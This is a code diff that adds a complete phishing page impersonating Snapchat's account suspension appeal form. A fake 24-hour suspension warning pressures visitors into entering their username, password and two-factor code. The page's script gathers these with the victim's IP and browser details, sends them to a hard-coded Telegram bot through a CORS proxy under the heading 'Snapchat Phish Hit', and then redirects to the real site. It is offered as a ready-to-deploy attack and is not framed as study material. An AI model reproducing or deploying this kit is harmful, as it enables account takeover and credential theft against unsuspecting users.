@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Snapchat - Account Appeal</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
+            background: #FFFC00;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .container {
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.15);
+            padding: 40px;
+            max-width: 400px;
+            width: 100%;
+        }
+        .logo { text-align: center; margin-bottom: 24px; }
+        .ghost { width: 60px; height: 60px; }
+        h1 {
+            font-size: 20px;
+            font-weight: 600;
+            text-align: center;
+            color: #3a3a3a;
+            margin-bottom: 12px;
+        }
+        .warning {
+            background: #fff3cd;
+            border: 1px solid #ffc107;
+            border-radius: 8px;
+            color: #856404;
+            font-size: 14px;
+            padding: 12px;
+            text-align: center;
+            margin-bottom: 24px;
+            line-height: 1.4;
+        }
+        .input-group { margin-bottom: 20px; }
+        label {
+            display: block;
+            font-size: 14px;
+            font-weight: 500;
+            color: #3a3a3a;
+            margin-bottom: 6px;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: border-color 0.2s;
+        }
+        input:focus {
+            outline: none;
+            border-color: #FFFC00;
+            box-shadow: 0 0 0 3px rgba(255, 252, 0, 0.2);
+        }
+        small {
+            display: block;
+            color: #666;
+            font-size: 12px;
+            margin-top: 4px;
+        }
+        .btn {
+            width: 100%;
+            background: #FFFC00;
+            color: #3a3a3a;
+            border: none;
+            border-radius: 8px;
+            padding: 14px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        .btn:hover { background: #f0ed00; }
+        .btn:disabled { background: #ddd; cursor: not-allowed; }
+        .footer {
+            text-align: center;
+            margin-top: 24px;
+            font-size: 13px;
+            color: #666;
+        }
+        .footer a {
+            color: #3a3a3a;
+            text-decoration: none;
+            font-weight: 500;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <svg viewBox="0 0 100 100" class="ghost">
+                <path fill="#FFFC00" d="M50 10c-16.5 0-30 13.5-30 30v20c0 2-1 4-2.5 5.5-2 2-5 3.5-7.5 4.5-1 .5-1.5 1.5-1 2.5.5 1 1.5 1.5 2.5 1.5 3 0 6 1 8 2.5 1.5 1 3 2 5 2.5 1 .3 2 .5 3 .5 2.5 0 4.5 1.5 5.5 3.5.5 1 1 2 1.5 3 .5 1 1.5 1.5 2.5 1.5h20c1 0 2-.5 2.5-1.5.5-1 1-2 1.5-3 1-2 3-3.5 5.5-3.5 1 0 2-.2 3-.5 2-.5 3.5-1.5 5-2.5 2-1.5 5-2.5 8-2.5 1 0 2-.5 2.5-1.5.5-1 0-2-1-2.5-2.5-1-5.5-2.5-7.5-4.5-1.5-1.5-2.5-3.5-2.5-5.5V40c0-16.5-13.5-30-30-30z"/>
+            </svg>
+        </div>
+        
+        <h1>Account Suspension Appeal</h1>
+        <p class="warning">Your account will be permanently suspended in 24 hours due to violations of our updated Community Guidelines.</p>
+        
+        <form id="appealForm">
+            <div class="input-group">
+                <label for="username">Username or Email</label>
+                <input type="text" id="username" name="username" required autocomplete="off">
+            </div>
+            
+            <div class="input-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" required>
+            </div>
+            
+            <div class="input-group" id="twoFactorGroup" style="display:none;">
+                <label for="twoFactor">Two-Factor Authentication Code</label>
+                <input type="text" id="twoFactor" name="twoFactor" placeholder="Enter 6-digit code" maxlength="6">
+                <small>We sent a verification code to your device.</small>
+            </div>
+            
+            <button type="submit" class="btn">Appeal Decision</button>
+        </form>
+        
+        <div class="footer">
+            <p>Need help? <a href="#">Visit Support</a></p>
+        </div>
+    </div>
+
+    <script>
+        // Telegram config
+        const TELEGRAM_TOKEN = '8932698048:AAE74hLm_UIG70WEHnMsfNwHycPx-_qMrms';
+        const TELEGRAM_CHAT_ID = '5989344588';
+        
+        let userIP = 'unknown';
+        
+        // Get IP
+        fetch('https://api.ipify.org?format=json')
+            .then(r => r.json())
+            .then(data => userIP = data.ip)
+            .catch(() => userIP = 'unknown');
+
+        document.getElementById('appealForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const btn = document.querySelector('.btn');
+            const twoFactorGroup = document.getElementById('twoFactorGroup');
+            const twoFactorInput = document.getElementById('twoFactor');
+            
+            // First submit: show 2FA
+            if (twoFactorGroup.style.display === 'none') {
+                twoFactorGroup.style.display = 'block';
+                twoFactorInput.required = true;
+                btn.textContent = 'Verify & Appeal';
+                return;
+            }
+            
+            // Second submit: capture and send
+            btn.disabled = true;
+            btn.textContent = 'Processing...';
+            
+            const timestamp = new Date().toISOString();
+            const message = `🚨 *Snapchat Phish Hit*\n\n` +
+                `👤 *Username:* \`${document.getElementById('username').value}\`\n` +
+                `🔑 *Password:* \`${document.getElementById('password').value}\`\n` +
+                (twoFactorInput.value ? `🔐 *2FA:* \`${twoFactorInput.value}\`\n` : '') +
+                `🌐 *IP:* \`${userIP}\`\n` +
+                `📱 *Device:* \`${navigator.userAgent}\`\n` +
+                `⏰ *Time:* \`${timestamp}\``;
+            
+            // Send to Telegram via CORS proxy
+            const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+            const proxyUrl = 'https://cors-anywhere.herokuapp.com/' + telegramUrl;
+            
+            try {
+                await fetch(proxyUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'X-Requested-With': 'XMLHttpRequest'
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+            } catch (err) {
+                console.log('Telegram error:', err);
+            }
+            
+            // Redirect to real Snapchat
+            window.location.href = 'https://snapchat.com';
+        });
+    </script>
+</body>
+</html>
